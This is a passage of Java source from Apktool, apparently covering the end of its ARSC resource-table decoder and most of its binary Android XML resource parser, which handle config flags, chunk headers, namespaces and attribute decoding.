            items[i] = new Duo<>(resId, (ResScalarValue) resValue);
        }

        return factory.bagFactory(parent, items, mTypeSpec);
    }

    private ResIntBasedValue readValue() throws IOException, AndrolibException {
		/* size */mIn.skipCheckShort((short) 8);
		/* zero */mIn.skipCheckByte((byte) 0);
        byte type = mIn.readByte();
        int data = mIn.readInt();

        return type == TypedValue.TYPE_STRING
                ? mPkg.getValueFactory().factory(mTableStrings.getHTML(data), data)
                : mPkg.getValueFactory().factory(type, data, null);
    }

    private ResConfigFlags readConfigFlags() throws IOException, AndrolibException {
        int size = mIn.readInt();
        int read = 28;

        if (size < 28) {
            throw new AndrolibException("Config size < 28");
        }

        boolean isInvalid = false;

        short mcc = mIn.readShort();
        short mnc = mIn.readShort();

        char[] language = this.unpackLanguageOrRegion(mIn.readByte(), mIn.readByte(), 'a');
        char[] country = this.unpackLanguageOrRegion(mIn.readByte(), mIn.readByte(), '0');

        byte orientation = mIn.readByte();
        byte touchscreen = mIn.readByte();

        int density = mIn.readUnsignedShort();

        byte keyboard = mIn.readByte();
        byte navigation = mIn.readByte();
        byte inputFlags = mIn.readByte();
		/* inputPad0 */mIn.skipBytes(1);

        short screenWidth = mIn.readShort();
        short screenHeight = mIn.readShort();

        short sdkVersion = mIn.readShort();
		/* minorVersion, now must always be 0 */mIn.skipBytes(2);

        byte screenLayout = 0;
        byte uiMode = 0;
        short smallestScreenWidthDp = 0;
        if (size >= 32) {
            screenLayout = mIn.readByte();
            uiMode = mIn.readByte();
            smallestScreenWidthDp = mIn.readShort();
            read = 32;
        }

        short screenWidthDp = 0;
        short screenHeightDp = 0;
        if (size >= 36) {
            screenWidthDp = mIn.readShort();
            screenHeightDp = mIn.readShort();
            read = 36;
        }

        char[] localeScript = null;
        char[] localeVariant = null;
        if (size >= 48) {
            localeScript = readScriptOrVariantChar(4).toCharArray();
            localeVariant = readScriptOrVariantChar(8).toCharArray();
            read = 48;
        }

        byte screenLayout2 = 0;
        byte colorMode = 0;
        if (size >= 52) {
            screenLayout2 = mIn.readByte();
            colorMode = mIn.readByte();
            mIn.skipBytes(2); // reserved padding
            read = 52;
        }

        if (size >= 56) {
            mIn.skipBytes(4);
            read = 56;
        }

        int exceedingSize = size - KNOWN_CONFIG_BYTES;
        if (exceedingSize > 0) {
            byte[] buf = new byte[exceedingSize];
            read += exceedingSize;
            mIn.readFully(buf);
            BigInteger exceedingBI = new BigInteger(1, buf);

            if (exceedingBI.equals(BigInteger.ZERO)) {
                LOGGER.fine(String
                        .format("Config flags size > %d, but exceeding bytes are all zero, so it should be ok.",
                                KNOWN_CONFIG_BYTES));
            } else {
                LOGGER.warning(String.format("Config flags size > %d. Size = %d. Exceeding bytes: 0x%X.",
                        KNOWN_CONFIG_BYTES, size, exceedingBI));
                isInvalid = true;
            }
        }

        int remainingSize = size - read;
        if (remainingSize > 0) {
            mIn.skipBytes(remainingSize);
        }

        return new ResConfigFlags(mcc, mnc, language, country,
                orientation, touchscreen, density, keyboard, navigation,
                inputFlags, screenWidth, screenHeight, sdkVersion,
                screenLayout, uiMode, smallestScreenWidthDp, screenWidthDp,
                screenHeightDp, localeScript, localeVariant, screenLayout2,
                colorMode, isInvalid, size);
    }

    private char[] unpackLanguageOrRegion(byte in0, byte in1, char base) {
        // check high bit, if so we have a packed 3 letter code
        if (((in0 >> 7) & 1) == 1) {
            int first = in1 & 0x1F;
            int second = ((in1 & 0xE0) >> 5) + ((in0 & 0x03) << 3);
            int third = (in0 & 0x7C) >> 2;

            // since this function handles languages & regions, we add the value(s) to the base char
            // which is usually 'a' or '0' depending on language or region.
            return new char[] { (char) (first + base), (char) (second + base), (char) (third + base) };
        }
        return new char[] { (char) in0, (char) in1 };
    }

    private String readScriptOrVariantChar(int length) throws IOException {
        StringBuilder string = new StringBuilder(16);

        while(length-- != 0) {
            short ch = mIn.readByte();
            if (ch == 0) {
                break;
            }
            string.append((char) ch);
        }
        mIn.skipBytes(length);

        return string.toString();
    }

    private void addTypeSpec(ResTypeSpec resTypeSpec) {
        mResTypeSpecs.put(resTypeSpec.getId(), resTypeSpec);
    }

    private void addMissingResSpecs() throws AndrolibException {
        int resId = mResId & 0xffff0000;

        for (int i = 0; i < mMissingResSpecs.length; i++) {
            if (!mMissingResSpecs[i]) {
                continue;
            }

            ResResSpec spec = new ResResSpec(new ResID(resId | i), "APKTOOL_DUMMY_" + Integer.toHexString(i), mPkg, mTypeSpec);

            // If we already have this resID dont add it again.
            if (! mPkg.hasResSpec(new ResID(resId | i))) {
                mPkg.addResSpec(spec);
                mTypeSpec.addResSpec(spec);

                if (mType == null) {
                    mType = mPkg.getOrCreateConfig(new ResConfigFlags());
                }

                // We are going to make dummy attributes a null reference (@null) now instead of a boolean false.
                // This is because aapt2 is much more strict when it comes to what we can put in an application.
                ResValue value = new ResReferenceValue(mPkg, 0, "");

                ResResource res = new ResResource(mType, spec, value);
                mType.addResource(res);
                spec.addResource(res);
            }
        }
    }

    private void removeResSpec(ResResSpec spec) throws AndrolibException {
        if (mPkg.hasResSpec(spec.getId())) {
            mPkg.removeResSpec(spec);
            mTypeSpec.removeResSpec(spec);
        }
    }

    private Header nextChunk() throws IOException {
        return mHeader = Header.read(mIn, mCountIn);
    }

    private void checkChunkType(int expectedType) throws AndrolibException {
        if (mHeader.type != expectedType) {
            throw new AndrolibException(String.format("Invalid chunk type: expected=0x%08x, got=0x%08x",
                    expectedType, mHeader.type));
        }
    }

    private void nextChunkCheckType(int expectedType) throws IOException, AndrolibException {
        nextChunk();
        checkChunkType(expectedType);
    }

    private final ExtDataInput mIn;
    private final ResTable mResTable;
    private final CountingInputStream mCountIn;
    private final List<FlagsOffset> mFlagsOffsets;
    private final boolean mKeepBroken;

    private Header mHeader;
    private StringBlock mTableStrings;
    private StringBlock mTypeNames;
    private StringBlock mSpecNames;
    private ResPackage mPkg;
    private ResTypeSpec mTypeSpec;
    private ResType mType;
    private int mResId;
    private int mTypeIdOffset = 0;
    private boolean[] mMissingResSpecs;
    private final HashMap<Integer, ResTypeSpec> mResTypeSpecs = new HashMap<>();

    private final static short ENTRY_FLAG_COMPLEX = 0x0001;
    private final static short ENTRY_FLAG_PUBLIC = 0x0002;
    private final static short ENTRY_FLAG_WEAK = 0x0004;

    public static class Header {
        public final short type;
        public final int headerSize;
        public final int chunkSize;
        public final int startPosition;
        public final int endPosition;

        public Header(short type, int headerSize, int chunkSize, int headerStart) {
            this.type = type;
            this.headerSize = headerSize;
            this.chunkSize = chunkSize;
            this.startPosition = headerStart;
            this.endPosition = headerStart + chunkSize;
        }

        public static Header read(ExtDataInput in, CountingInputStream countIn) throws IOException {
            short type;
            int start = countIn.getCount();
            try {
                type = in.readShort();
            } catch (EOFException ex) {
                return new Header(TYPE_NONE, 0, 0, countIn.getCount());
            }
            return new Header(type, in.readShort(), in.readInt(), start);
        }

        public final static short TYPE_NONE = -1;
        public final static short TYPE_STRING_POOL = 0x0001;
        public final static short TYPE_TABLE = 0x0002;
        public final static short TYPE_XML = 0x0003;

        public final static short XML_TYPE_PACKAGE = 0x0200;
        public final static short XML_TYPE_TYPE = 0x0201;
        public final static short XML_TYPE_SPEC_TYPE = 0x0202;
        public final static short XML_TYPE_LIBRARY = 0x0203;
        public final static short XML_TYPE_OVERLAY = 0x0204;
        public final static short XML_TYPE_OVERLAY_POLICY = 0x0205;
        public final static short XML_TYPE_STAGED_ALIAS = 0x0206;
    }

    public static class FlagsOffset {
        public final int offset;
        public final int count;

        public FlagsOffset(int offset, int count) {
            this.offset = offset;
            this.count = count;
        }
    }

    private class EntryData {
        public short mFlags;
        public int mSpecNamesId;
        public ResValue mValue;
    }

    private static final Logger LOGGER = Logger.getLogger(ARSCDecoder.class.getName());
    private static final int KNOWN_CONFIG_BYTES = 56;

    public static class ARSCData {

        public ARSCData(ResPackage[] packages, FlagsOffset[] flagsOffsets, ResTable resTable) {
            mPackages = packages;
            mFlagsOffsets = flagsOffsets;
            mResTable = resTable;
        }

        public FlagsOffset[] getFlagsOffsets() {
            return mFlagsOffsets;
        }

        public ResPackage[] getPackages() {
            return mPackages;
        }

        public ResPackage getOnePackage() throws AndrolibException {
            if (mPackages.length <= 0) {
                throw new AndrolibException("Arsc file contains zero packages");
            } else if (mPackages.length != 1) {
                int id = findPackageWithMostResSpecs();
                LOGGER.info("Arsc file contains multiple packages. Using package "
                        + mPackages[id].getName() + " as default.");

                return mPackages[id];
            }
            return mPackages[0];
        }

        public int findPackageWithMostResSpecs() {
            int count = mPackages[0].getResSpecCount();
            int id = 0;

            for (int i = 0; i < mPackages.length; i++) {
                if (mPackages[i].getResSpecCount() >= count) {
                    count = mPackages[i].getResSpecCount();
                    id = i;
                }
            }
            return id;
        }

        public ResTable getResTable() {
            return mResTable;
        }

        private final ResPackage[] mPackages;
        private final FlagsOffset[] mFlagsOffsets;
        private final ResTable mResTable;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/AXmlResourceParser.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import android.content.res.XmlResourceParser;
import android.util.TypedValue;
import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResID;
import brut.androlib.res.xml.ResXmlEncoders;
import brut.util.ExtDataInput;
import com.google.common.io.LittleEndianDataInputStream;
import org.xmlpull.v1.XmlPullParserException;
import java.io.DataInput;
import java.io.IOException;
import java.io.InputStream;
import java.io.Reader;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * Binary xml files parser.
 *
 * Parser has only two states: (1) Operational state, which parser
 * obtains after first successful call to next() and retains until
 * open(), close(), or failed call to next(). (2) Closed state, which
 * parser obtains after open(), close(), or failed call to next(). In
 * this state methods return invalid values or throw exceptions.
 *
 * TODO: * check all methods in closed state
 */
public class AXmlResourceParser implements XmlResourceParser {

    public AXmlResourceParser() {
        resetEventInfo();
    }

    public AXmlResourceParser(InputStream stream) {
        this();
        open(stream);
    }

    public AndrolibException getFirstError() {
        return mFirstError;
    }

    public ResAttrDecoder getAttrDecoder() {
        return mAttrDecoder;
    }

    public void setAttrDecoder(ResAttrDecoder attrDecoder) {
        mAttrDecoder = attrDecoder;
    }

    public void open(InputStream stream) {
        close();
        if (stream != null) {
            // We need to explicitly cast to DataInput as otherwise the constructor is ambiguous.
            // We choose DataInput instead of InputStream as ExtDataInput wraps an InputStream in
            // a DataInputStream which is big-endian and ignores the little-endian behavior.
            m_reader = new ExtDataInput((DataInput) new LittleEndianDataInputStream(stream));
        }
    }

    @Override
    public void close() {
        if (!m_operational) {
            return;
        }
        m_operational = false;
        m_reader = null;
        m_strings = null;
        m_resourceIDs = null;
        m_namespaces.reset();
        resetEventInfo();
    }

    // ///////////////////////////////// iteration
    @Override
    public int next() throws XmlPullParserException, IOException {
        if (m_reader == null) {
            throw new XmlPullParserException("Parser is not opened.", this, null);
        }
        try {
            doNext();
            return m_event;
        } catch (IOException e) {
            close();
            throw e;
        }
    }

    @Override
    public int nextToken() throws XmlPullParserException, IOException {
        return next();
    }

    @Override
    public int nextTag() throws XmlPullParserException, IOException {
        int eventType = next();
        if (eventType == TEXT && isWhitespace()) {
            eventType = next();
        }
        if (eventType != START_TAG && eventType != END_TAG) {
            throw new XmlPullParserException("Expected start or end tag.", this, null);
        }
        return eventType;
    }

    @Override
    public String nextText() throws XmlPullParserException, IOException {
        if (getEventType() != START_TAG) {
            throw new XmlPullParserException("Parser must be on START_TAG to read next text.", this, null);
        }
        int eventType = next();
        if (eventType == TEXT) {
            String result = getText();
            eventType = next();
            if (eventType != END_TAG) {
                throw new XmlPullParserException("Event TEXT must be immediately followed by END_TAG.", this, null);
            }
            return result;
        } else if (eventType == END_TAG) {
            return "";
        } else {
            throw new XmlPullParserException("Parser must be on START_TAG or TEXT to read text.", this, null);
        }
    }

    @Override
    public void require(int type, String namespace, String name)
            throws XmlPullParserException, IOException {
        if (type != getEventType() || (namespace != null && !namespace.equals(getNamespace()))
                || (name != null && !name.equals(getName()))) {
            throw new XmlPullParserException(TYPES[type] + " is expected.", this, null);
        }
    }

    @Override
    public int getDepth() {
        return m_namespaces.getDepth() - 1;
    }

    @Override
    public int getEventType() throws XmlPullParserException {
        return m_event;
    }

    @Override
    public int getLineNumber() {
        return m_lineNumber;
    }

    @Override
    public String getName() {
        if (m_name == -1 || (m_event != START_TAG && m_event != END_TAG)) {
            return null;
        }
        return m_strings.getString(m_name);
    }

    @Override
    public String getText() {
        if (m_name == -1 || m_event != TEXT) {
            return null;
        }
        return m_strings.getString(m_name);
    }

    @Override
    public char[] getTextCharacters(int[] holderForStartAndLength) {
        String text = getText();
        if (text == null) {
            return null;
        }
        holderForStartAndLength[0] = 0;
        holderForStartAndLength[1] = text.length();
        char[] chars = new char[text.length()];
        text.getChars(0, text.length(), chars, 0);
        return chars;
    }

    @Override
    public String getNamespace() {
        return m_strings.getString(m_namespaceUri);
    }

    @Override
    public String getPrefix() {
        int prefix = m_namespaces.findPrefix(m_namespaceUri);
        return m_strings.getString(prefix);
    }

    @Override
    public String getPositionDescription() {
        return "XML line #" + getLineNumber();
    }

    @Override
    public int getNamespaceCount(int depth) {
        return m_namespaces.getAccumulatedCount(depth);
    }

    @Override
    public String getNamespacePrefix(int pos) {
        int prefix = m_namespaces.getPrefix(pos);
        return m_strings.getString(prefix);
    }

    @Override
    public String getNamespaceUri(int pos) {
        int uri = m_namespaces.getUri(pos);
        return m_strings.getString(uri);
    }

    // ///////////////////////////////// attributes
    @Override
    public String getClassAttribute() {
        if (m_classAttribute == -1) {
            return null;
        }
        int offset = getAttributeOffset(m_classAttribute);
        int value = m_attributes[offset + ATTRIBUTE_IX_VALUE_STRING];
        return m_strings.getString(value);
    }

    @Override
    public String getIdAttribute() {
        if (m_idAttribute == -1) {
            return null;
        }
        int offset = getAttributeOffset(m_idAttribute);
        int value = m_attributes[offset + ATTRIBUTE_IX_VALUE_STRING];
        return m_strings.getString(value);
    }

    @Override
    public int getIdAttributeResourceValue(int defaultValue) {
        if (m_idAttribute == -1) {
            return defaultValue;
        }
        int offset = getAttributeOffset(m_idAttribute);
        int valueType = m_attributes[offset + ATTRIBUTE_IX_VALUE_TYPE];
        if (valueType != TypedValue.TYPE_REFERENCE) {
            return defaultValue;
        }
        return m_attributes[offset + ATTRIBUTE_IX_VALUE_DATA];
    }

    @Override
    public int getStyleAttribute() {
        if (m_styleAttribute == -1) {
            return 0;
        }
        int offset = getAttributeOffset(m_styleAttribute);
        return m_attributes[offset + ATTRIBUTE_IX_VALUE_DATA];
    }

    @Override
    public int getAttributeCount() {
        if (m_event != START_TAG) {
            return -1;
        }
        return m_attributes.length / ATTRIBUTE_LENGTH;
    }

    @Override
    public String getAttributeNamespace(int index) {
        int offset = getAttributeOffset(index);
        int namespace = m_attributes[offset + ATTRIBUTE_IX_NAMESPACE_URI];
        if (namespace == -1) {
            return "";
        }

        // Minifiers like removing the namespace, so we will default to default namespace
        // unless the pkgId of the resource is private. We will grab the non-standard one.
        String value = m_strings.getString(namespace);

        if (value.length() == 0) {
            ResID resourceId = new ResID(getAttributeNameResource(index));
            if (resourceId.package_ == PRIVATE_PKG_ID) {
                value = getNonDefaultNamespaceUri(offset);
            } else {
                value = android_ns;
            }
        }

        return value;
    }

    private String getNonDefaultNamespaceUri(int offset) {
        String prefix = m_strings.getString(m_namespaces.getPrefix(offset));
        if (prefix != null) {
            return  m_strings.getString(m_namespaces.getUri(offset));
        }

        // If we are here. There is some clever obfuscation going on. Our reference points to the namespace are gone.
        // Normally we could take the index * attributeCount to get an offset.
        // That would point to the URI in the StringBlock table, but that is empty.
        // We have the namespaces that can't be touched in the opening tag.
        // Though no known way to correlate them at this time.
        // So return the res-auto namespace.
        return "http://schemas.android.com/apk/res-auto";
    }

    @Override
    public String getAttributePrefix(int index) {
        int offset = getAttributeOffset(index);
        int uri = m_attributes[offset + ATTRIBUTE_IX_NAMESPACE_URI];
        int prefix = m_namespaces.findPrefix(uri);
        if (prefix == -1) {
            return "";
        }
        return m_strings.getString(prefix);
    }

    @Override
    public String getAttributeName(int index) {
        int offset = getAttributeOffset(index);
        int name = m_attributes[offset + ATTRIBUTE_IX_NAME];
        if (name == -1) {
            return "";
        }

        String value = m_strings.getString(name);

        // some attributes will return "", we must rely on the resource_id and refer to the frameworks
        // to match the resource id to the name. ex: 0x101021C = versionName
        if (value.length() == 0 || android_ns.equals(getAttributeNamespace(index))) {
            try {
                int resourceId = getAttributeNameResource(index);
                if (resourceId != 0) {
                    value = mAttrDecoder.decodeManifestAttr(getAttributeNameResource(index));
                }
            } catch (AndrolibException | NullPointerException ignored) {}
        }
        return value;
    }

    @Override
    public int getAttributeNameResource(int index) {
        int offset = getAttributeOffset(index);
        int name = m_attributes[offset + ATTRIBUTE_IX_NAME];
        if (m_resourceIDs == null || name < 0 || name >= m_resourceIDs.length) {
            return 0;
        }
        return m_resourceIDs[name];
    }

    @Override
    public int getAttributeValueType(int index) {
        int offset = getAttributeOffset(index);
        return m_attributes[offset + ATTRIBUTE_IX_VALUE_TYPE];
    }

    @Override
    public int getAttributeValueData(int index) {
        int offset = getAttributeOffset(index);
        return m_attributes[offset + ATTRIBUTE_IX_VALUE_DATA];
    }

    @Override
    public String getAttributeValue(int index) {
        int offset = getAttributeOffset(index);
        int valueType = m_attributes[offset + ATTRIBUTE_IX_VALUE_TYPE];
        int valueData = m_attributes[offset + ATTRIBUTE_IX_VALUE_DATA];
        int valueRaw = m_attributes[offset + ATTRIBUTE_IX_VALUE_STRING];

        if (mAttrDecoder != null) {
            try {
                return mAttrDecoder.decode(
                        valueType,
                        valueData,
                        valueRaw == -1 ? null : ResXmlEncoders.escapeXmlChars(m_strings.getString(valueRaw)),
                        getAttributeNameResource(index));
            } catch (AndrolibException ex) {
                setFirstError(ex);
                LOGGER.log(Level.WARNING, String.format("Could not decode attr value, using undecoded value "
                                + "instead: ns=%s, name=%s, value=0x%08x",
                        getAttributePrefix(index),
                        getAttributeName(index),
                        valueData), ex);
            }
        }
        return TypedValue.coerceToString(valueType, valueData);
    }

    @Override
    public boolean getAttributeBooleanValue(int index, boolean defaultValue) {
        return getAttributeIntValue(index, defaultValue ? 1 : 0) != 0;
    }

    @Override
    public float getAttributeFloatValue(int index, float defaultValue) {
        int offset = getAttributeOffset(index);
        int valueType = m_attributes[offset + ATTRIBUTE_IX_VALUE_TYPE];
        if (valueType == TypedValue.TYPE_FLOAT) {
            int valueData = m_attributes[offset + ATTRIBUTE_IX_VALUE_DATA];
            return Float.intBitsToFloat(valueData);
        }
        return defaultValue;
    }

    @Override
    public int getAttributeIntValue(int index, int defaultValue) {
        int offset = getAttributeOffset(index);
        int valueType = m_attributes[offset + ATTRIBUTE_IX_VALUE_TYPE];
        if (valueType >= TypedValue.TYPE_FIRST_INT && valueType <= TypedValue.TYPE_LAST_INT) {
            return m_attributes[offset + ATTRIBUTE_IX_VALUE_DATA];
        }
        return defaultValue;
    }

    @Override
    public int getAttributeUnsignedIntValue(int index, int defaultValue) {
        return getAttributeIntValue(index, defaultValue);
    }

    @Override
    public int getAttributeResourceValue(int index, int defaultValue) {
        int offset = getAttributeOffset(index);
        int valueType = m_attributes[offset + ATTRIBUTE_IX_VALUE_TYPE];
        if (valueType == TypedValue.TYPE_REFERENCE) {
            return m_attributes[offset + ATTRIBUTE_IX_VALUE_DATA];
        }
        return defaultValue;
    }

    @Override
    public String getAttributeValue(String namespace, String attribute) {
        int index = findAttribute(namespace, attribute);
        if (index == -1) {
            return "";
        }
        return getAttributeValue(index);
    }

    @Override
    public boolean getAttributeBooleanValue(String namespace, String attribute, boolean defaultValue) {
        int index = findAttribute(namespace, attribute);
        if (index == -1) {
            return defaultValue;
        }
        return getAttributeBooleanValue(index, defaultValue);
    }

    @Override
    public float getAttributeFloatValue(String namespace, String attribute, float defaultValue) {
        int index = findAttribute(namespace, attribute);
        if (index == -1) {
            return defaultValue;
        }
        return getAttributeFloatValue(index, defaultValue);
    }

    @Override
    public int getAttributeIntValue(String namespace, String attribute, int defaultValue) {
        int index = findAttribute(namespace, attribute);
        if (index == -1) {
            return defaultValue;
        }
        return getAttributeIntValue(index, defaultValue);
    }

    @Override
    public int getAttributeUnsignedIntValue(String namespace, String attribute, int defaultValue) {
        int index = findAttribute(namespace, attribute);
        if (index == -1) {
            return defaultValue;
        }
        return getAttributeUnsignedIntValue(index, defaultValue);
    }

    @Override
    public int getAttributeResourceValue(String namespace, String attribute, int defaultValue) {
        int index = findAttribute(namespace, attribute);
        if (index == -1) {
            return defaultValue;
        }
        return getAttributeResourceValue(index, defaultValue);
    }

    @Override
    public int getAttributeListValue(int index, String[] options, int defaultValue) {
        // TODO implement
        return 0;
    }

    @Override
    public int getAttributeListValue(String namespace, String attribute, String[] options, int defaultValue) {
        // TODO implement
        return 0;
    }

    @Override
    public String getAttributeType(int index) {
        return "CDATA";
    }

    @Override
    public boolean isAttributeDefault(int index) {
        return false;
    }

    // ///////////////////////////////// dummies
    @Override
    public void setInput(InputStream stream, String inputEncoding) {
        open(stream);
    }

    @Override
    public void setInput(Reader reader) throws XmlPullParserException {
        throw new XmlPullParserException(E_NOT_SUPPORTED);
    }

    @Override
    public String getInputEncoding() {
        return null;
    }

    @Override
    public int getColumnNumber() {
        return -1;
    }

    @Override
    public boolean isEmptyElementTag() {
        return false;
    }

    @Override
    public boolean isWhitespace() {
        return false;
    }

    @Override
    public void defineEntityReplacementText(String entityName, String replacementText)
            throws XmlPullParserException {
        throw new XmlPullParserException(E_NOT_SUPPORTED);
    }

    @Override
    public String getNamespace(String prefix) {
        throw new RuntimeException(E_NOT_SUPPORTED);
    }

    @Override
    public Object getProperty(String name) {
        return null;
    }

    @Override
    public void setProperty(String name, Object value)
            throws XmlPullParserException {
        throw new XmlPullParserException(E_NOT_SUPPORTED);
    }

    @Override
    public boolean getFeature(String feature) {
        return false;
    }

    @Override
    public void setFeature(String name, boolean value)
            throws XmlPullParserException {
        throw new XmlPullParserException(E_NOT_SUPPORTED);
    }

    // /////////////////////////////////////////// implementation
    /**
     * Namespace stack, holds prefix+uri pairs, as well as depth information.
     * All information is stored in one int[] array. Array consists of depth
     * frames: Data=DepthFrame*; DepthFrame=Count+[Prefix+Uri]*+Count;
     * Count='count of Prefix+Uri pairs'; Yes, count is stored twice, to enable
     * bottom-up traversal. increaseDepth adds depth frame, decreaseDepth
     * removes it. push/pop operations operate only in current depth frame.
     * decreaseDepth removes any remaining (not pop'ed) namespace pairs. findXXX
     * methods search all depth frames starting from the last namespace pair of
     * current depth frame. All functions that operate with int, use -1 as
     * 'invalid value'.
     *
     * !! functions expect 'prefix'+'uri' pairs, not 'uri'+'prefix' !!
     *
     */
    private static final class NamespaceStack {

        public NamespaceStack() {
            m_data = new int[32];
        }

        public void reset() {
            m_dataLength = 0;
            m_depth = 0;
        }

        public int getCurrentCount() {
            if (m_dataLength == 0) {
                return 0;
            }
            int offset = m_dataLength - 1;
            return m_data[offset];
        }

        public int getAccumulatedCount(int depth) {
            if (m_dataLength == 0 || depth < 0) {
                return 0;
            }
            if (depth > m_depth) {
                depth = m_depth;
            }
            int accumulatedCount = 0;
            int offset = 0;
            for (; depth != 0; --depth) {
                int count = m_data[offset];
                accumulatedCount += count;
                offset += (2 + count * 2);
            }
            return accumulatedCount;
        }

        public void push(int prefix, int uri) {
            if (m_depth == 0) {
                increaseDepth();
            }
            ensureDataCapacity(2);
            int offset = m_dataLength - 1;
            int count = m_data[offset];
            m_data[offset - 1 - count * 2] = count + 1;
            m_data[offset] = prefix;
            m_data[offset + 1] = uri;
            m_data[offset + 2] = count + 1;
            m_dataLength += 2;
        }

        public boolean pop() {
            if (m_dataLength == 0) {
                return false;
            }
            int offset = m_dataLength - 1;
            int count = m_data[offset];
            if (count == 0) {
                return false;
            }
            count -= 1;
            offset -= 2;
            m_data[offset] = count;
            offset -= (1 + count * 2);
            m_data[offset] = count;
            m_dataLength -= 2;
            return true;
        }

        public int getPrefix(int index) {
            return get(index, true);
        }

        public int getUri(int index) {
            return get(index, false);
        }

        public int findPrefix(int uri) {
            return find(uri, false);
        }

        public int getDepth() {
            return m_depth;
        }

        public void increaseDepth() {
            ensureDataCapacity(2);
            int offset = m_dataLength;
            m_data[offset] = 0;
            m_data[offset + 1] = 0;
            m_dataLength += 2;
            m_depth += 1;
        }

        public void decreaseDepth() {
            if (m_dataLength == 0) {
                return;
            }
            int offset = m_dataLength - 1;
            int count = m_data[offset];
            if ((offset - 1 - count * 2) == 0) {
                return;
            }
            m_dataLength -= 2 + count * 2;
            m_depth -= 1;
        }

        private void ensureDataCapacity(int capacity) {
            int available = (m_data.length - m_dataLength);
            if (available > capacity) {
                return;
            }
            int newLength = (m_data.length + available) * 2;
            int[] newData = new int[newLength];
            System.arraycopy(m_data, 0, newData, 0, m_dataLength);
            m_data = newData;
        }

        private int find(int prefixOrUri, boolean prefix) {
            if (m_dataLength == 0) {
                return -1;
            }
            int offset = m_dataLength - 1;
            for (int i = m_depth; i != 0; --i) {
                int count = m_data[offset];
                offset -= 2;
                for (; count != 0; --count) {
                    if (prefix) {
                        if (m_data[offset] == prefixOrUri) {
                            return m_data[offset + 1];
                        }
                    } else {
                        if (m_data[offset + 1] == prefixOrUri) {
                            return m_data[offset];
                        }
                    }
                    offset -= 2;
                }
            }
            return -1;
        }

        private int get(int index, boolean prefix) {
            if (m_dataLength == 0 || index < 0) {
                return -1;
            }
            int offset = 0;
            for (int i = m_depth; i != 0; --i) {
                int count = m_data[offset];
                if (index >= count) {
                    index -= count;
                    offset += (2 + count * 2);
                    continue;
                }
                offset += (1 + index * 2);
                if (!prefix) {
                    offset += 1;
                }
                return m_data[offset];
            }
            return -1;
        }

        private int[] m_data;
        private int m_dataLength;
        private int m_depth;
    }

    private int getAttributeOffset(int index) {
        if (m_event != START_TAG) {
            throw new IndexOutOfBoundsException("Current event is not START_TAG.");
        }
        int offset = index * ATTRIBUTE_LENGTH;
        if (offset >= m_attributes.length) {
            throw new IndexOutOfBoundsException("Invalid attribute index (" + index + ").");
        }
        return offset;
    }

    private int findAttribute(String namespace, String attribute) {
        if (m_strings == null || attribute == null) {
            return -1;
        }
        int name = m_strings.find(attribute);
        if (name == -1) {
            return -1;
        }
        int uri = (namespace != null) ? m_strings.find(namespace) : -1;
        for (int o = 0; o != m_attributes.length; o += ATTRIBUTE_LENGTH) {
            if (name == m_attributes[o + ATTRIBUTE_IX_NAME]
                    && (uri == -1 || uri == m_attributes[o + ATTRIBUTE_IX_NAMESPACE_URI])) {
                return o / ATTRIBUTE_LENGTH;
            }
        }
        return -1;
    }

    private void resetEventInfo() {
        m_event = -1;
        m_lineNumber = -1;
        m_name = -1;
        m_namespaceUri = -1;
        m_attributes = null;
        m_idAttribute = -1;
        m_classAttribute = -1;
        m_styleAttribute = -1;
    }

    private void doNext() throws IOException {
        // Delayed initialization.
        if (m_strings == null) {
            m_reader.skipCheckInt(CHUNK_AXML_FILE, CHUNK_AXML_FILE_BROKEN);

			/*
			 * chunkSize
			 */
            m_reader.skipInt();
            m_strings = StringBlock.read(m_reader);
            m_namespaces.increaseDepth();
            m_operational = true;
        }

        if (m_event == END_DOCUMENT) {
            return;
        }

        int event = m_event;
        resetEventInfo();

        while (true) {
            if (m_decreaseDepth) {
                m_decreaseDepth = false;
                m_namespaces.decreaseDepth();
            }

            // Fake END_DOCUMENT event.
            if (event == END_TAG && m_namespaces.getDepth() == 1 && m_namespaces.getCurrentCount() == 0) {
                m_event = END_DOCUMENT;
                break;
            }

            int chunkType;
            if (event == START_DOCUMENT) {
                // Fake event, see CHUNK_XML_START_TAG handler.
                chunkType = CHUNK_XML_START_TAG;
            } else {
                chunkType = m_reader.readInt();
            }

            if (chunkType == CHUNK_RESOURCEIDS) {
                int chunkSize = m_reader.readInt();
                if (chunkSize < 8 || (chunkSize % 4) != 0) {
                    throw new IOException("Invalid resource ids size (" + chunkSize + ").");
                }
                m_resourceIDs = m_reader.readIntArray(chunkSize / 4 - 2);
                continue;
            }

            if (chunkType < CHUNK_XML_FIRST || chunkType > CHUNK_XML_LAST) {
                throw new IOException("Invalid chunk type (" + chunkType + ").");
            }

            // Fake START_DOCUMENT event.
            if (chunkType == CHUNK_XML_START_TAG && event == -1) {
                m_event = START_DOCUMENT;
                break;
            }

            // Common header.
			/* chunkSize */m_reader.skipInt();
            int lineNumber = m_reader.readInt();
			/* 0xFFFFFFFF */m_reader.skipInt();

            if (chunkType == CHUNK_XML_START_NAMESPACE || chunkType == CHUNK_XML_END_NAMESPACE) {
                if (chunkType == CHUNK_XML_START_NAMESPACE) {
                    int prefix = m_reader.readInt();
                    int uri = m_reader.readInt();
                    m_namespaces.push(prefix, uri);
                } else {
					/* prefix */m_reader.skipInt();
					/* uri */m_reader.skipInt();
                    m_namespaces.pop();
                }
                continue;
            }

            m_lineNumber = lineNumber;

            if (chunkType == CHUNK_XML_START_TAG) {
                m_namespaceUri = m_reader.readInt();
                m_name = m_reader.readInt();
				/* flags? */m_reader.skipInt();
                int attributeCount = m_reader.readInt();
                m_idAttribute = (attributeCount >>> 16) - 1;
                attributeCount &= 0xFFFF;
                m_classAttribute = m_reader.readInt();
